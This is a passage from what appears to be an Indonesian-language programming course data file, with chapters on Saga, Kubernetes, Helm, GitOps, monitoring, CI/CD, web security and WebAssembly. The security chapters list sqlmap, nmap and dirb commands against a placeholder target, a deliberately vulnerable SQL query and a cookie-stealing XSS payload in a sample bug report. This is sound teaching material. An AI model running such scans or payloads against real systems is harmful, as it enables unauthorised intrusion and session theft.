Pattern** adalah cara menangani transaksi di microservices. Karena tidak ada database shared, kita tidak bisa pakai ACID transaction tradisional.\\n\\n**Cara kerja Saga:**\\n1. Setiap step adalah local transaction di service masing-masing.\\n2. Kalau step gagal, jalankan **compensating transaction** untuk undo step sebelumnya.\\n\\n**Orchestration Saga:**\\nAda orchestrator (conductor) yang mengatur urutan step.\\n\\n**Choreography Saga:**\\nTidak ada orchestrator. Setiap service publish event, service lain listen dan react.\", codeExample: { language: \"javascript\", code: \"// ORCHESTRATION SAGA\\nclass OrderSaga {\\n  async execute(order) {\\n    try {\\n      const payment = await this.paymentService.charge(order);\\n      \\n      try {\\n        const inventory = await this.inventoryService.reserve(order);\\n        \\n        try {\\n          await this.shippingService.schedule(order);\\n          return { status: 'SUCCESS' };\\n        } catch (e) {\\n          await this.inventoryService.release(inventory.id); // Compensate\\n          throw e;\\n        }\\n      } catch (e) {\\n        await this.paymentService.refund(payment.id); // Compensate\\n        throw e;\\n      }\\n    } catch (e) {\\n      return { status: 'FAILED', reason: e.message };\\n    }\\n  }\\n}\\n\\n// CHOREOGRAPHY SAGA (Event-driven)\\n// Payment Service\\nasync function handleOrderCreated(event) {\\n  try {\\n    const payment = await charge(event.order);\\n    await eventBus.publish('PaymentProcessed', { orderId: event.order.id, paymentId: payment.id });\\n  } catch {\\n    await eventBus.publish('PaymentFailed', { orderId: event.order.id });\\n  }\\n}\\n\\n// Inventory Service (listen PaymentProcessed)\\nasync function handlePaymentProcessed(event) {\\n  try {\\n    await reserveInventory(event.orderId);\\n    await eventBus.publish('InventoryReserved', { orderId: event.orderId });\\n  } catch {\\n    await eventBus.publish('InventoryReservationFailed', { orderId: event.orderId });\\n  }\\n}\" }, explainAlong: \"Baris 2-20: Orchestration saga dengan compensate. Baris 23-36: Choreography saga dengan event-driven.\", aiPrompt: \"Jelaskan bedanya orchestration dan choreography saga. Kapan masing-masing?\", reflection: \"Desain saga untuk proses checkout e-commerce. Apa compensate actions-nya?\" },\n];\n\n// ============================================================\n// MODUL 11: DevOps & Cloud Native (6 chapters)\n// ============================================================\nconst modul11: Chapter[] = [\n  { id: \"11.1\", moduleId: 11, chapterNum: \"11.1\", title: \"Kubernetes: Container Orchestration\", subtitle: \"Pod, Deployment, Service, dan Ingress\", level: \"Lanjut\", objectives: [\"Memahami konsep Kubernetes\", \"Bisa deploy aplikasi ke Kubernetes\"], analogy: { diagram: \"Docker = Kontainer\\nKubernetes = Pelabuhan (mengatur ribuan kontainer)\\n\\n[Ship Captain] = Control Plane\\n[Container] = Pod\\n[Crane] = Deployment\\n[Dock Worker] = Node\", caption: \"Kubernetes mengatur container deployment, scaling, dan management\" }, explanation: \"**Kubernetes (K8s)** adalah platform open-source untuk mengatur container.\n\nDia menangani deployment, scaling, dan management aplikasi containerized.\\n\\n**Konsep Dasar:**\\n- **Pod** → Unit terkecil, biasanya 1 container.\\n- **Deployment** → Mendefinisikan desired state (replicas,\n\nVersion).\\n- **Service** → Expose pod ke network (internal/external).\\n- **Ingress** → HTTP/S routing ke services.\\n- **ConfigMap/Secret** → Konfigurasi dan sensitive data.\", codeExample: { language: \"yaml\", code: \"# deployment.yaml\\napiVersion: apps/v1\\nkind: Deployment\\nmetadata:\\n  name: my-app\\nspec:\\n  replicas: 3\\n  selector:\\n    matchLabels:\\n      app: my-app\\n  template:\\n    metadata:\\n      labels:\\n        app: my-app\\n    spec:\\n      containers:\\n      - name: app\\n        image: my-app:latest\\n        ports:\\n        - containerPort: 3000\\n---\\n# service.yaml\\napiVersion: v1\\nkind: Service\\nmetadata:\\n  name: my-app-service\\nspec:\\n  selector:\\n    app: my-app\\n  ports:\\n  - port: 80\\n    targetPort: 3000\\n  type: LoadBalancer\\n---\\n# ingress.yaml\\napiVersion: networking.k8s.io/v1\\nkind: Ingress\\nmetadata:\\n  name: my-app-ingress\\nspec:\\n  rules:\\n  - host: myapp.com\\n    http:\\n      paths:\\n      - path: /\\n        backend:\\n          service:\\n            name: my-app-service\\n            port: { number: 80 }\" }, explainAlong: \"Baris 1-18: Deployment dengan 3 replicas. Baris 20-31: Service. Baris 33-45: Ingress.\", aiPrompt: \"Jelaskan bedanya Pod dan Container.\", reflection: \"Setup minikube di local. Deploy aplikasi dengan 3 replicas.\" },\n  { id: \"11.2\", moduleId: 11, chapterNum: \"11.2\", title: \"Helm: Package Manager untuk Kubernetes\", subtitle: \"Chart, template, values, dan release management\", level: \"Lanjut\", objectives: [\"Memahami konsep Helm\", \"Bisa membuat Helm chart\"], analogy: { diagram: \"Kubernetes YAML = Memasak dari Resep Manual\\nHelm = Instant Meal Kit (sudah jadi, tinggal parameterkan)\\n\\n[Helm Chart] → [Values] → [Rendered Manifests] → [K8s]\", caption: \"Helm seperti meal kit untuk Kubernetes — package reusable\" }, explanation: \"**Helm** adalah package manager untuk Kubernetes. Dia memungkinkan kamu package, configure, dan deploy aplikasi ke K8s dengan template.\\n\\n**Konsep Helm:**\\n- **Chart** → Package aplikasi (collection of YAML templates).\\n- **Values** → Konfigurasi yang diinject ke template.\\n- **Release** → Instance chart yang sudah di-deploy.\\n- **Repository** → Tempat menyimpan dan share charts.\\n\\n**Keuntungan Helm:**\\n1. **Templating** → 1 chart, banyak environment (dev/staging/prod).\\n2. **Versioning** → Rollback ke versi sebelumnya.\\n3. **Dependency** → Chart bisa bergantung pada chart lain.\", codeExample: { language: \"yaml\", code: \"# Chart structure:\\n# mychart/\\n#   Chart.yaml\\n#   values.yaml\\n#   templates/\\n#     deployment.yaml\\n\\n# templates/deployment.yaml\\napiVersion: apps/v1\\nkind: Deployment\\nmetadata:\\n  name: {{ .Release.Name }}-app\\nspec:\\n  replicas: {{ .Values.replicaCount }}\\n  template:\\n    spec:\\n      containers:\\n      - name: app\\n        image: {{ .Values.image.repository }}:{{ .Values.image.tag }}\\n        resources:\\n          requests:\\n            memory: {{ .Values.resources.requests.memory }}\\n\\n# values.yaml\\nreplicaCount: 2\\nimage:\\n  repository: my-app\\n  tag: latest\\nresources:\\n  requests:\\n    memory: \\\"128Mi\\\"\\n\\n# Deploy\\nhelm install my-release ./mychart\\nhelm upgrade my-release ./mychart\\nhelm rollback my-release 1\" }, explainAlong: \"Baris 7-16: Templated deployment. Baris 18-25: Values file. Baris 27-29: Helm commands.\", aiPrompt: \"Jelaskan bedanya Helm dan Kustomize.\", reflection: \"Buat Helm chart untuk aplikasimu. Deploy dengan values berbeda untuk dev dan prod.\" },\n  { id: \"11.3\", moduleId: 11, chapterNum: \"11.3\", title: \"GitOps: Deployment dengan Git\", subtitle: \"ArgoCD, Flux, dan declarative infrastructure\", level: \"Lanjut\", objectives: [\"Memahami konsep GitOps\", \"Bisa setup ArgoCD\"], analogy: { diagram: \"Traditional Ops = Chef Manual:\\n[Developer] → SSH ke server → Edit file → Restart service\\n\\nGitOps = Smart Kitchen:\\n[Developer] → Push ke Git → [ArgoCD] → Auto sync ke K8s\", caption: \"GitOps — Git sebagai single source of truth untuk infrastructure\" }, explanation: \"**GitOps** adalah pendekatan di mana Git menjadi single source of truth untuk infrastructure dan aplikasi. Setiap perubahan diaudit, reviewable, dan reversible.\\n\\n**Prinsip GitOps:**\\n1. **Declarative** → Infrastructure didefinisikan sebagai code (YAML).\\n2. **Versioned** → Semua perubahan di Git.\\n3.\n\n**Pulled Automatically** → Agent (ArgoCD/Flux) sync ke cluster.\\n4. **Continuously Reconciled** → Kalau cluster drift, auto-correct.\\n\\n**ArgoCD** → GitOps continuous delivery tool untuk Kubernetes.\\n- Web UI untuk melihat application state.\\n- Auto-sync dan self-healing.\\n- Support Helm, Kustomize, plain YAML.\", codeExample: { language: \"yaml\", code: \"# ArgoCD Application\\napiVersion: argoproj.io/v1alpha1\\nkind: Application\\nmetadata:\\n  name: my-app\\n  namespace: argocd\\nspec:\\n  project: default\\n  source:\\n    repoURL: https://github.com/my-org/my-app.git\\n    targetRevision: main\\n    path: k8s/\\n  destination:\\n    server: https://kubernetes.default.svc\\n    namespace: production\\n  syncPolicy:\\n    automated:\\n      prune: true\\n      selfHeal: true\\n    syncOptions:\\n    - CreateNamespace=true\" }, explainAlong: \"Baris 1-20: ArgoCD Application CRD dengan auto-sync.\", aiPrompt: \"Jelaskan bedanya GitOps dan traditional CI/CD.\", reflection: \"Setup ArgoCD di cluster. Connect ke repo Git. Lakukan deployment via Git push.\" },\n  { id: \"11.4\", moduleId: 11, chapterNum: \"11.4\", title: \"Monitoring Cluster dengan Prometheus dan Grafana\", subtitle: \"Metrics, alerting, dan dashboard\", level: \"Lanjut\", objectives: [\"Memahami monitoring Kubernetes\", \"Bisa setup Prometheus dan Grafana\"], analogy: { diagram: \"Monitoring = Dashboard Mobil:\\n\\n[Prometheus] = Sensor (mengumpulkan data)\\n[Grafana] = Dashboard (menampilkan grafik)\\n[AlertManager] = Alarm (berbunyi kalau ada masalah)\", caption: \"Prometheus mengumpulkan metrics, Grafana menampilkannya\" }, explanation: \"**Prometheus** adalah sistem monitoring dan alerting untuk Kubernetes. Dia mengumpulkan metrics dari pod, node, dan aplikasi.\\n\\n**Stack Monitoring:**\\n1. **Prometheus** → Scrape metrics, store time-series data.\\n2. **Grafana** → Visualisasi metrics dalam dashboard.\\n3.\n\n**AlertManager** → Kirim notifikasi (Slack, email, PagerDuty).\\n4. **Node Exporter** → Metrics dari node (CPU, memory, disk).\\n\\n**Key Metrics:**\\n- Pod CPU/Memory usage.\\n- Request rate, error rate, latency (RED method).\\n- Node health dan resource utilization.\", codeExample: { language: \"yaml\", code: \"# ServiceMonitor untuk scraping metrics\\napiVersion: monitoring.coreos.com/v1\\nkind: ServiceMonitor\\nmetadata:\\n  name: my-app-metrics\\nspec:\\n  selector:\\n    matchLabels:\\n      app: my-app\\n  endpoints:\\n  - port: metrics\\n    interval: 30s\\n    path: /metrics\\n\\n# Prometheus Rule (Alerting)\\napiVersion: monitoring.coreos.com/v1\\nkind: PrometheusRule\\nmetadata:\\n  name: my-app-alerts\\nspec:\\n  groups:\\n  - name: my-app\\n    rules:\\n    - alert: HighErrorRate\\n      expr: rate(http_requests_total{status=~\\\"5..\\\"}[5m]) > 0.05\\n      for: 5m\\n      annotations:\\n        summary: \\\"High error rate detected\\\"\\n\\n# Application metrics (Node.js)\\nconst client = require('prom-client');\\nconst httpRequests = new client.Counter({\\n  name: 'http_requests_total',\\n  help: 'Total HTTP requests',\\n  labelNames: ['method', 'status']\\n});\\n\\napp.use((req, res, next) => {\\n  res.on('finish', () => {\\n    httpRequests.inc({ method: req.method, status: res.statusCode });\\n  });\\n  next();\\n});\" }, explainAlong: \"Baris 1-11: ServiceMonitor. Baris 13-24: PrometheusRule. Baris 26-36: App instrumentation.\", aiPrompt: \"Jelaskan RED method untuk monitoring.\", reflection: \"Setup Prometheus + Grafana di cluster. Buat dashboard untuk aplikasimu.\" },\n  { id: \"11.5\", moduleId: 11, chapterNum: \"11.5\", title: \"CI/CD untuk Kubernetes\", subtitle: \"GitHub Actions, Tekton, dan Argo Workflows\", level: \"Lanjut\", objectives: [\"Memahami CI/CD untuk Kubernetes\", \"Bisa membuat pipeline deployment otomatis\"], analogy: { diagram: \"CI/CD Pipeline = Lini Produksi:\\n\\n[Code Push] → [Test] → [Build Image] → [Push to Registry] → [Deploy to K8s]\\n     ↓           ↓          ↓               ↓                  ↓\\n   Developer   Robot QA   Docker Hub    Container Registry   ArgoCD\", caption: \"Pipeline otomatis dari code push sampai deploy ke Kubernetes\" }, explanation: \"CI/CD untuk Kubernetes melibatkan build Docker image, push ke registry, dan deploy ke cluster.\\n\\n**Pipeline Steps:**\\n1. **Test** → Unit test, lint, type check.\\n2. **Build** → Build Docker image.\\n3. **Push** → Push image ke registry (ECR, GCR, Docker Hub).\\n4.\n\n**Update Manifest** → Update image tag di Git (GitOps).\\n5. **Deploy** → ArgoCD sync ke cluster.\\n\\n**Tools:**\\n- **GitHub Actions/GitLab CI** → CI pipeline.\\n- **Tekton** → Cloud-native CI/CD di Kubernetes.\\n- **Argo Workflows** → Workflow engine untuk K8s.\", codeExample: { language: \"yaml\", code: \"# .github/workflows/k8s-deploy.yml\\nname: Deploy to K8s\\n\\non:\\n  push:\\n    branches: [main]\\n\\njobs:\\n  build:\\n    runs-on: ubuntu-latest\\n    steps:\\n      - uses: actions/checkout@v4\\n      \\n      - name: Build image\\n        run: docker build -t my-app:${{ github.sha }} .\\n      \\n      - name: Push to ECR\\n        run: |\\n          aws ecr get-login-password | docker login --username AWS --password-stdin $ECR_URL\\n          docker push my-app:${{ github.sha }}\\n      \\n      - name: Update manifest\\n        run: |\\n          sed -i 's|image: .*|image: my-app:${{ github.sha }}|' k8s/deployment.yaml\\n          git add . && git commit -m \\\"deploy: ${{ github.sha }}\\\" && git push\\n\\n      - name: Sync ArgoCD\\n        run: argocd app sync my-app\" }, explainAlong: \"Baris 4-6: Trigger. Baris 8-11: Checkout dan build. Baris 13-16: Push ke ECR. Baris 18-20: Update manifest. Baris 22: Sync ArgoCD.\", aiPrompt: \"Jelaskan bedanya push-based dan pull-based deployment.\", reflection: \"Buat pipeline GitHub Actions yang build, push, dan deploy ke K8s.\" },\n  { id: \"11.6\", moduleId: 11, chapterNum: \"11.6\", title: \"Security di Kubernetes\", subtitle: \"RBAC, NetworkPolicy, Pod Security, dan Secrets\", level: \"Lanjut\", objectives: [\"Memahami keamanan Kubernetes\", \"Bisa mengimplementasikan RBAC dan NetworkPolicy\"], analogy: { diagram: \"K8s Security = Keamanan Gedung:\\n\\n[RBAC] = Kartu Akses (siapa bisa ke mana)\\n[NetworkPolicy] = Firewall antar lantai\\n[Pod Security] = Aturan di dalam ruangan\\n[Secrets] = Brankas (data sensitif terenkripsi)\", caption: \"Keamanan Kubernetes — kontrol akses, network isolation, dan secret management\" }, explanation: \"Keamanan Kubernetes mencakup beberapa lapisan:\\n\\n**1. RBAC (Role-Based Access Control)**\\nMengontrol siapa yang bisa apa di cluster.\\n- Role → Permissions di 1 namespace.\\n- ClusterRole → Permissions di seluruh cluster.\\n- RoleBinding → Hubungkan user/group ke Role.\\n\\n**2. NetworkPolicy**\\nFirewall antar pod — kontrol siapa bisa komunikasi dengan siapa.\\n\\n**3. Pod Security Standards**\\n- Privileged → Tidak ada restrictions.\\n- Baseline → Minimal restrictions.\\n- Restricted → Maksimal security (non-root, read-only fs).\\n\\n**4. Secrets**\\nMenyimpan sensitive data (password, token, key) terenkripsi.\", codeExample: { language: \"yaml\", code: \"# RBAC\\napiVersion: rbac.authorization.k8s.io/v1\\nkind: Role\\nmetadata:\\n  namespace: default\\n  name: pod-reader\\nrules:\\n- apiGroups: [\\\"\\\"]\\n  resources: [\\\"pods\\\"]\\n  verbs: [\\\"get\\\", \\\"list\\\"]\\n---\\napiVersion: rbac.authorization.k8s.io/v1\\nkind: RoleBinding\\nmetadata:\\n  name: read-pods\\n  namespace: default\\nsubjects:\\n- kind: User\\n  name: budi\\n  apiGroup: rbac.authorization.k8s.io\\nroleRef:\\n  kind: Role\\n  name: pod-reader\\n  apiGroup: rbac.authorization.k8s.io\\n\\n# NETWORK POLICY\\napiVersion: networking.k8s.io/v1\\nkind: NetworkPolicy\\nmetadata:\\n  name: api-allow\\nspec:\\n  podSelector:\\n    matchLabels:\\n      app: api\\n  policyTypes:\\n  - Ingress\\n  ingress:\\n  - from:\\n    - podSelector:\\n        matchLabels:\\n          app: frontend\\n\\n# SECRET\\napiVersion: v1\\nkind: Secret\\nmetadata:\\n  name: db-credentials\\ntype: Opaque\\ndata:\\n  username: YWRtaW4=\\n  password: c2VjcmV0MTIz\" }, explainAlong: \"Baris 1-21: RBAC Role dan RoleBinding. Baris 24-36: NetworkPolicy. Baris 38-46: Secret.\", aiPrompt: \"Jelaskan bedanya Role dan ClusterRole.\", reflection: \"Audit security cluster-mu. Apakah RBAC sudah proper? NetworkPolicy ada?\" },\n];\n\n// ============================================================\n// MODUL 12: Web Security Advanced (4 chapters)\n// ============================================================\nconst modul12: Chapter[] = [\n  { id: \"12.1\", moduleId: 12, chapterNum: \"12.1\", title: \"OWASP Top 10 dan Pentesting\", subtitle: \"A01-A10 security risks dan metodologi pentest\", level: \"Lanjut\", objectives: [\"Memahami OWASP Top 10 2021\", \"Bisa melakukan penetration testing dasar\"], analogy: { diagram: \"OWASP Top 10 = Daftar Penyakit Paling Umum:\\n\\n1. Broken Access Control    = Pintu tidak terkunci\\n2. Cryptographic Failures   = Brankas dengan kode 1234\\n3. Injection                 = Suntik racun ke makanan\\n4. Insecure Design           = Gedung tanpa arsitektur aman\\n5. Security Misconfiguration = Alarm mati, lampu terbuka\\n6. Vulnerable Components     = Peralatan kadaluarsa\\n7. Auth Failures             = Password 'password'\\n8. Integrity Failures        = Surat tanpa meterai\\n9. Logging Failures          = Kejahatan tanpa CCTV\\n10. SSRF                     = Minta antar ke tempat terlarang\", caption: \"OWASP Top 10 — 10 risiko keamanan web paling kritis\" }, explanation: \"**OWASP Top 10** adalah daftar 10 risiko keamanan web paling kritis, diupdate setiap 3-4 tahun. Versi 2021 mencakup:\\n\\n1. **Broken Access Control** — User bisa akses data orang lain. Contoh: ganti `/profile/123` ke `/profile/124`.\\n2.\n\n**Cryptographic Failures** — Data sensitif tidak terenkripsi, hardcoded keys.\\n3. **Injection** — SQL, NoSQL, OS command injection.\\n4. **Insecure Design** — Masalah arsitektural, tidak ada threat modeling.\\n5. **Security Misconfiguration** — Default password, unnecessary features enabled.\\n6.\n\n**Vulnerable Components** — Dependencies outdated dengan known vulnerabilities.\\n7. **Authentication Failures** — Brute force, credential stuffing.\\n8. **Software Integrity Failures** — CI/CD pipeline tanpa verification.\\n9. **Logging Failures** — Tidak ada logging untuk deteksi incident.\\n10.\n\n**SSRF** — Server-Side Request Forgery.\\n\\n**Pentesting Methodology:** Reconnaissance → Scanning → Vulnerability Assessment → Exploitation → Reporting.\", codeExample: { language: \"python\", code: \"# IDOR VULNERABILITY\\n# VULNERABLE\\n@app.get(\\\"/api/orders/{order_id}\\\")\\ndef get_order(order_id: int):\\n    order = db.query(f\\\"SELECT * FROM orders WHERE id = {order_id}\\\")\\n    return order  # User bisa lihat order siapa saja!\\n\\n# SECURE\\n@app.get(\\\"/api/orders/{order_id}\\\")\\ndef get_order(order_id: int, user: User = Depends(get_current_user)):\\n    order = db.query(\\\"SELECT * FROM orders WHERE id = ? AND user_id = ?\\\",\\n                     (order_id, user.id))\\n    if not order:\\n        raise HTTPException(403, \\\"Forbidden\\\")\\n    return order\\n\\n# PENTEST TOOLS\\n# nmap -sV -sC target.com       # Port scanning\\n# dirb https://target.com       # Directory brute force\\n# sqlmap -u \\\"https://target.com?id=1\\\" --dbs  # SQL injection\" }, explainAlong: \"Baris 3-6: VULNERABLE. Baris 9-15: SECURE dengan ownership check. Baris 18-20: Pentest tools.\", aiPrompt: \"Jelaskan SSRF dan berikan contoh exploitation.\", reflection: \"Lakukan security audit pada aplikasimu. Identifikasi risiko dari OWASP Top 10.\" },\n  { id: \"12.2\", moduleId: 12, chapterNum: \"12.2\", title: \"Web Security Headers\", subtitle: \"HSTS, CSP, X-Frame-Options, dan security headers lengkap\", level: \"Lanjut\", objectives: [\"Memahami security headers HTTP\", \"Bisa mengimplementasikan CSP dan HSTS\"], analogy: { diagram: \"Security Headers = Sistem Keamanan Gedung:\\n\\nHSTS       = Paksa pakai jalan aman (HTTPS only)\\nCSP        = Daftar pengunjung yang diizinkan\\nX-Frame    = Anti penyusup lewat jendela (clickjacking)\\nX-XSS      = Filter penyusup\\nReferrer   = Jangan sebut asal muasal\", caption: \"Security headers — lapisan proteksi tambahan di HTTP response\" }, explanation: \"**Security Headers** adalah HTTP response headers yang memberikan instruksi ke browser untuk melindungi aplikasi dari serangan umum.\\n\\n**Headers Penting:**\\n- **Strict-Transport-Security (HSTS)** → Paksa HTTPS, prevent downgrade attack.\\n- **Content-Security-Policy (CSP)** → Kontrol sumber resource (script, style,\n\nImage).\\n- **X-Frame-Options** → Prevent clickjacking (embedding di iframe).\\n- **X-Content-Type-Options** → Prevent MIME type sniffing.\\n- **Referrer-Policy** → Kontrol informasi referrer.\\n\\n**CSP Directives:**\\n- `default-src 'self'` → Default hanya dari origin sendiri.\\n- `script-src 'self' 'nonce-abc123'` → Script hanya dari self atau dengan nonce.\\n- `style-src 'self' 'unsafe-inline'` → Style dari self atau inline.\", codeExample: { language: \"javascript\", code: \"// EXPRESS SECURITY HEADERS\\nconst helmet = require('helmet');\\napp.use(helmet());\\n\\n// CSP MANUAL\\napp.use((req, res, next) => {\\n  res.setHeader('Content-Security-Policy',\\n    \\\"default-src 'self'; \\\" +\\n    \\\"script-src 'self' 'nonce-abc123' https://cdn.example.com; \\\" +\\n    \\\"style-src 'self' 'unsafe-inline'; \\\" +\\n    \\\"img-src 'self' https: data:; \\\" +\\n    \\\"font-src 'self' https://fonts.gstatic.com; \\\" +\\n    \\\"connect-src 'self' https://api.example.com\\\"\\n  );\\n  next();\\n});\\n\\n// HSTS\\napp.use((req, res, next) => {\\n  res.setHeader('Strict-Transport-Security',\\n    'max-age=31536000; includeSubDomains; preload');\\n  next();\\n});\\n\\n// NONCE GENERATION (untuk inline script)\\napp.use((req, res, next) => {\\n  res.locals.nonce = crypto.randomBytes(16).toString('base64');\\n  next();\\n});\" }, explainAlong: \"Baris 2-3: Helmet. Baris 6-15: CSP manual. Baris 18-21: HSTS. Baris 24-27: Nonce generation.\", aiPrompt: \"Jelaskan bedanya CSP 'self' dan 'unsafe-inline'.\", reflection: \"Cek security headers website-mu di securityheaders.com. Skor berapa?\" },\n  { id: \"12.3\", moduleId: 12, chapterNum: \"12.3\", title: \"Authentication dan Authorization Lanjut\", subtitle: \"RBAC, ABAC, OAuth 2.1, dan OpenID Connect\", level: \"Lanjut\", objectives: [\"Memahami RBAC dan ABAC\", \"Bisa mengimplementasikan role-based access control\"], analogy: { diagram: \"Authentication = KTP (siapa kamu)\\nAuthorization = Kartu Akses (kamu bisa ke mana)\\n\\nRBAC = Peran (Dokter bisa ruang operasi)\\nABAC = Atribut (Dokter + Shift pagi + ruang 3)\", caption: \"Authentication = identitas, Authorization = izin akses\" }, explanation: \"**Authentication** = Memverifikasi identitas (siapa kamu). **Authorization** = Menentukan izin akses (apa yang boleh kamu lakukan).\\n\\n**RBAC (Role-Based Access Control)**\\nAkses berdasarkan role. Contoh: Admin, Editor, Viewer.\\n\\n**ABAC (Attribute-Based Access Control)**\\nAkses berdasarkan atribut (user, resource, environment). Lebih fleksibel dari RBAC.\\n\\n**OAuth 2.1** → Update dari OAuth 2.0 dengan security improvements.\\n- PKCE required untuk public clients.\\n- Redirect URI exact matching.\\n- No implicit grant.\\n\\n**OpenID Connect (OIDC)** → Layer identity di atas OAuth 2.0.\\n- ID Token (JWT) berisi info user.\\n- UserInfo endpoint.\\n- Standard claims (name, email, picture).\", codeExample: { language: \"javascript\", code: \"// RBAC MIDDLEWARE\\nconst requireRole = (roles) => (req, res, next) => {\\n  if (!roles.includes(req.user.role)) {\\n    return res.status(403).json({ error: 'Insufficient permissions' });\\n  }\\n  next();\\n};\\n\\napp.delete('/users/:id',\\n  authenticate,\\n  requireRole(['admin', 'superadmin']),\\n  deleteUser\\n);\\n\\n// ABAC POLICY\\nconst canAccessDocument = (user, doc) => {\\n  return (\\n    user.department === doc.department ||\\n    user.role === 'admin' ||\\n    (user.role === 'manager' && user.level >= doc.classificationLevel)\\n  );\\n};\\n\\n// OIDC ID TOKEN DECODE\\nimport { jwtDecode } from 'jwt-decode';\\nconst idToken = jwtDecode(tokens.id_token);\\nconsole.log(idToken.sub, idToken.name, idToken.email);\" }, explainAlong: \"Baris 2-9: RBAC middleware. Baris 12-18: ABAC policy. Baris 21-23: OIDC ID Token decode.\", aiPrompt: \"Jelaskan bedanya RBAC dan ABAC. Kapan masing-masing?\", reflection: \"Implementasikan RBAC di aplikasimu. Minimal 3 role: admin, editor, viewer.\" },\n  { id: \"12.4\", moduleId: 12, chapterNum: \"12.4\", title: \"Bug Bounty dan Responsible Disclosure\", subtitle: \"Cara melaporkan vulnerability dan etika security\", level: \"Lanjut\", objectives: [\"Memahami responsible disclosure\", \"Bisa melaporkan vulnerability dengan benar\"], analogy: { diagram: \"Bug Bounty = Hadiah Menemukan Kekunci:\\n\\n[Kamu] → Temukan kelemahan → [Lapor ke perusahaan]\\n                              ↓\\n                    [Verifikasi] → [Perbaiki]\\n                              ↓\\n                    [Hadiah untuk kamu!] 💰\", caption: \"Bug bounty — dapat hadiah untuk menemukan dan melaporkan vulnerability\" }, explanation: \"**Bug Bounty** adalah program di mana perusahaan memberikan hadiah kepada security researcher yang menemukan dan melaporkan vulnerability secara bertanggung jawab.\\n\\n**Responsible Disclosure:**\\n1. Temukan vulnerability.\\n2. Jangan eksploitasi atau disclose ke publik.\\n3. Laporkan ke perusahaan (security@company.com).\\n4.\n\nBerikan waktu yang cukup untuk fix (biasanya 90 hari).\\n5. Setelah fix, boleh publish write-up.\\n\\n**Platform Bug Bounty:**\\n- HackerOne\\n- Bugcrowd\\n- Intigriti\\n\\n**Tips:**\\n- Baca scope program (apa yang in-scope).\\n- Jangan test tanpa izin (illegal!).\\n- Dokumentasikan dengan jelas.\\n- Screenshot dan POC (Proof of Concept).\", codeExample: { language: \"markdown\", code: \"# CONTOH BUG REPORT\\n\\n## Title: Stored XSS di Profile Page\\n\\n## Severity: High\\n\\n## Description:\\nInput nama profil tidak di-sanitize, memungkinkan penyerang\\nmenyisipkan script jahat.\\n\\n## Steps to Reproduce:\\n1. Login ke aplikasi\\n2. Buka halaman profil\\n3. Masukkan payload: `<script>alert(document.cookie)</script>`\\n4. Simpan profil\\n5. Buka profil dari akun lain\\n6. Alert muncul!\\n\\n## Impact:\\nPencurian session cookie, account takeover.\\n\\n## Mitigation:\\nEscape output menggunakan DOMPurify atau innerText.\\n\\n## POC Screenshot:\\n[screenshot.png]\" }, explainAlong: \"Template bug report yang jelas dan profesional.\", aiPrompt: \"Jelaskan responsible disclosure policy.\", reflection: \"Cari program bug bounty di HackerOne. Baca scope dan rules-nya.\" },\n];\n\n// ============================================================\n// MODUL 13: WebAssembly & High Performance (4 chapters)\n// ============================================================\nconst modul13: Chapter[] = [\n  { id: \"13.1\", moduleId: 13, chapterNum: \"13.1\", title: \"WebAssembly: Kode Native di Browser\", subtitle: \"Konsep WASM, use cases, dan performa\", level: \"Lanjut\", objectives: [\"Memahami konsep WebAssembly\", \"Bisa mengintegrasikan WASM dengan JavaScript\"], analogy: { diagram: \"JS = Interpreter (Penerjemah)\\nWASM = Mesin Langsung (Native speed)\\n\\n[JS Source] → Parse → Compile → Optimize → Execute\\n[WASM]     → Decode → Execute (sudah teroptimasi!)\", caption: \"WebAssembly berjalan mendekati native speed di browser\" }, explanation: \"**WebAssembly (WASM)** adalah binary instruction format yang berjalan di browser dengan kecepatan mendekati native.\n\nWASM bukan bahasa pemrograman — dia adalah compilation target.\\n\\n**Use Cases WASM:**\\n- Game engine di browser (Unity, Unreal).\\n- Video/photo editing (Photoshop web, Figma).\\n- Scientific computing, simulation.\\n- Cryptography,\n\nCompression.\\n\\n**Keuntungan WASM:**\\n- **Fast** — Dekati native speed (10-20% slower).\\n- **Safe** — Sandboxed execution environment.\\n- **Portable** — Run di semua modern browser.\\n- **Language agnostic** — Compile dari C, C++, Rust, Go.\\n\\n**WASM tidak menggantikan JavaScript** — mereka bekerja bersama.\n\nJS untuk orchestration, WASM untuk computationally-intensive tasks.\", codeExample: { language: \"javascript\", code: \"// LOAD WASM MODULE\\nasync function loadWasm() {\\n  const response = await fetch('calculator.wasm');\\n  const bytes = await response.arrayBuffer();\\n  const module = await WebAssembly.compile(bytes);\\n  const instance = await WebAssembly.instantiate(module, {\\n    env: {\\n      memory: new WebAssembly.Memory({ initial: 256 }),\\n      abort: () => console.log('Abort called')\\n    }\\n  });\\n  \\n  // Call WASM function\\n  const result = instance.exports.add(5, 3);\\n  console.log(result); // 8\\n}\\n\\n// WITH WASM-BINDGEN (Rust)\\n// #[wasm_bindgen]\\n// pub fn fibonacci(n: u32) -> u32 {\\n//     match n {\\n//         0 => 0,\\n//         1 => 1,\\n//         _ => fibonacci(n - 1) + fibonacci(n - 2),\\n//     }\\n// }\\n\\n// JavaScript usage:\\n// import { fibonacci } from './pkg/wasm_fib.js';\\n// console.log(fibonacci(40));\" }, explainAlong: \"Baris 2-12: Load dan instantiate WASM. Baris 15-18: Call exported function. Baris 21-30: Rust wasm-bindgen example.\", aiPrompt: \"Jelaskan kapan menggunakan WASM vs JavaScript murni.\", reflection: \"Benchmark operasi matematika: JS vs WASM. Berapa perbedaannya?\" },\n  { id: \"13.2\", moduleId: 13, chapterNum: \"13.2\", title: \"Rust untuk WebAssembly\", subtitle: \"wasm-bindgen, wasm-pack, dan integrasi JS\", level: \"Lanjut\", objectives: [\"Memahami Rust toolchain untuk WASM\", \"Bisa menulis kode Rust yang compile ke WASM\"], analogy: { diagram: \"Rust = Safety Gear + Speed\\nWASM = Race Track\\n\\n[Rust] → Compile → [WASM] → Run di Browser\\n(Safe)              (Fast)       (Universal)\", caption: \"Rust adalah bahasa yang ideal untuk compile ke WASM\" }, explanation: \"**Rust** adalah bahasa systems programming yang ideal untuk WASM karena:\\n1.\n\n**Memory safety** tanpa garbage collector.\\n2.\n\n**Zero-cost abstractions** — high-level code, low-level performance.\\n3.\n\n**Excellent WASM tooling** — wasm-bindgen, wasm-pack.\\n\\n**Toolchain:**\\n- **wasm-pack** → Build, test,\n\nDan publish Rust-generated WASM.\\n- **wasm-bindgen** → Facilitate interaction antara Rust dan JS.\\n- **web-sys** → Rust bindings untuk Web APIs.\\n\\n**Setup:**\\n```bash\\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\\ncargo install 